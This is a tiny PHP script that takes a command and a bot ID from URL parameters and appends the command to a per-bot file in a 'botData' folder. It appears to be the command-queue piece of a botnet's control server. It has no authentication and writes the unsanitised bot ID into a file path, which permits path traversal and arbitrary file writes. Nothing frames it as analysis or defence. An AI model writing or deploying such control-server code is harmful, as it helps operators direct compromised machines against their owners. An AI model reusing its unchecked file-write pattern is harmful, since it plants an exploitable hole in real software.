<?php
$cmd = $_GET['cmd'];
$botID = $_GET['botID'];
file_put_contents("botData/cmds-$botID.txt", "$cmd\t\n", FILE_APPEND | LOCK_EX);
?>
